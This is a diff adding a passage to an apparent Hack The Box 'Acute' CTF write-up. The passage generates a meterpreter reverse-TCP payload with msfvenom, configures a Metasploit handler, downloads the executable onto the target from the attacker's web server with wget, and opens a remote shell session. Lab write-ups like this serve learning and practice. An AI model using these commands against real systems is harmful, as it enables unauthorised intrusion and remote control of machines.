@@ -95,3 +95,62 @@ After some blind trys we got a valind request:
 and we are in as edavies!
 
 ![](/img/pshell.png)
+
+this web console is a bit of pain,`winpeas` is messed up, I'll generate a meterpreter shell
+
+### Generaing meterpreter payload
+```bash
+werz@ctf01:~/ctf/htb/acute$ msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=9001 LHOST=10.10.14.141 -f exe -o shell.exe
+```
+We need the metasploit console, also the options configuration: 
+
+for running metasploit console use:
+> msfconsole
+
+```bash
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LPORT 9001
+LPORT => 9001
+msf6 exploit(multi/handler) > set LHOST tun0
+LHOST => 10.10.14.141
+msf6 exploit(multi/handler) >
+```
+
+### Uploading the reverse shell
+
+I'll setup a python webserver:
+> python3 -m http.server 8080
+
+
+we have no access to write for most of the directories, but we can in `C:\Utils>`
+
+```powershell
+PS C:\Utils> wget 10.10.14.141:8080/shell.exe -outfile rev.exe
+```
+Now we should run the meterpreter listener, after that execute the exe file:
+
+```bash
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.14.141:9001
+```
+
+web powershel console:
+
+```powershell
+PS C:\Utils> .\rev.exe
+```
+
+and we got a hit back:
+
+```bash
+[*] Sending stage (200774 bytes) to 10.10.11.145
+[*] Meterpreter session 1 opened (10.10.14.141:9001 -> 10.10.11.145:49857) at 2022-07-24 17:39:49 +0000
+
+meterpreter >
+```
+
+to be continued...
